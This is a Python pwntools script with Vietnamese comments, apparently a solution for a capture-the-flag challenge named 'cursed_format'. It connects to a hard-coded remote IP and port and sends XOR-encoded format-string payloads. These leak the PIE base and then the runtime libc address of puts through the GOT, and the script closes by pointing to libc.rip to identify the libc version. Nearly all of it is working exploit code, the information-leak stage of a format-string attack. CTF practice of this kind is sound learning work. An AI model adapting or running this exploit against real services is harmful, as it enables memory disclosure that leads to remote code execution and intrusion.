from pwn import *

context.log_level = 'error'
BINARY = './cursed_format'
HOST = '18.212.136.134'
PORT = 8887

# Kết nối
p = remote(HOST, PORT)

# Key ban đầu
current_key = b'\xff' * 32

def xor(s1, s2):
    return bytes([a ^ b for a, b in zip(s1, s2)])

def send_fmt(payload):
    global current_key
    payload = payload.ljust(32, b'\x00')
    to_send = xor(payload, current_key)
    p.sendlineafter(b'>> ', b'1')
    sleep(0.05)
    p.send(to_send)
    current_key = payload
    return p.recvuntil(b'1. Keep', drop=True)

print("[*] Bắt đầu leak puts@got...")

# 1. Leak PIE Base trước (để biết địa chỉ GOT)
# Dùng offset 20 như đã xác định
payload_pie = b'%20$p'
leak_pie_str = send_fmt(payload_pie).strip()
leak_pie = int(leak_pie_str, 16)
pie_base = leak_pie - 0x12f4
print(f"[+] PIE Base: {hex(pie_base)}")

# 2. Tính địa chỉ puts@got
# Load binary để lấy offset got
exe = ELF(BINARY, checksec=False)
exe.address = pie_base
puts_got = exe.got['puts']
print(f"[+] Puts GOT: {hex(puts_got)}")

# 3. Leak giá trị tại puts@got
# Payload: "%7$sAAAA" + p64(puts_got)
# %7$s sẽ đọc string tại địa chỉ nằm ở offset 7 (chính là p64(puts_got) nằm cuối payload)
# Ta chèn "AAAA" để căn lề cho địa chỉ nằm chẵn ở block tiếp theo
leak_payload = b'%7$sAAAA' + p64(puts_got)
leak_data = send_fmt(leak_payload)

# Xử lý output: lấy 6 bytes đầu tiên (địa chỉ thực của puts)
# Output sẽ có dạng: [ADDR_PUTS]AAAA...
# Cần cẩn thận vì puts address có thể chứa null byte ở cuối, nhưng %s sẽ dừng ở đó.
# Thường địa chỉ libc 64-bit có 6 bytes.

real_puts_addr = u64(leak_data[:6].ljust(8, b'\x00'))
print(f"\n[!!!] KẾT QUẢ LEAK [!!!]")
print(f"Địa chỉ thực của puts: {hex(real_puts_addr)}")
print(f"Hãy vào https://libc.rip/, nhập 'puts' và giá trị '{hex(real_puts_addr)}' để tìm Libc chuẩn.")